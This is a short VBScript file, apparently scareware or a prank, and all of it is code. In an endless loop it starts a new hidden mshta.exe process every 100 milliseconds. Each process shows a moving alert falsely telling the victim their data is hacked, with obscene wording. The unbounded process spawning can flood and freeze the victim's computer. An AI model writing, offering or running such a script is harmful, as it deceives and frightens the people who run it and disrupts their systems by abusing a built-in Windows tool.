Option Explicit

' Function to generate random position
Function GetRandomPosition(maxValue)
    GetRandomPosition = Int(Rnd() * maxValue)
End Function

' Function to generate circular position
Function GetCircularPosition(radius, angle)
    GetCircularPosition = Array(radius * Cos(angle), radius * Sin(angle))
End Function

' Convert degrees to radians
Function DegreesToRadians(degrees)
    DegreesToRadians = degrees * (3.14159265358979 / 180)
End Function

' Get screen dimensions
Dim ScreenWidth, ScreenHeight, CenterX, CenterY, Radius
ScreenWidth = 1920  ' Approximation based on standard screen width
ScreenHeight = 1080  ' Approximation based on standard screen height
CenterX = ScreenWidth / 2
CenterY = ScreenHeight / 2
Radius = Min(ScreenWidth, ScreenHeight) / 3  ' Radius for the circular motion

' Function to find the minimum of two values
Function Min(a, b)
    If a < b Then
        Min = a
    Else
        Min = b
    End If
End Function

' Loop indefinitely
Do
    Dim i, angle, circularPosition, posX, posY, cmd
    i = 0
    Do
        angle = (i * 360 / 50) Mod 360  ' Ensure the angle wraps around after a full circle
        circularPosition = GetCircularPosition(Radius, DegreesToRadians(angle))
        posX = CenterX + circularPosition(0)
        posY = CenterY + circularPosition(1)
        cmd = "mshta.exe ""about:<hta:application><script>window.resizeTo(300,150);window.moveTo " & posX & "," & posY & ";alert('Your Data is Hacked & You are being Fucked up !!!!');window.close();</script>"""
        CreateObject("WScript.Shell").Run cmd, 0, False
        WScript.Sleep 100  ' Brief pause to allow window to position

        i = i + 1
    Loop While True
    ' Wait for a while before restarting the loop
    WScript.Sleep(2000) ' Check every 2 seconds
Loop
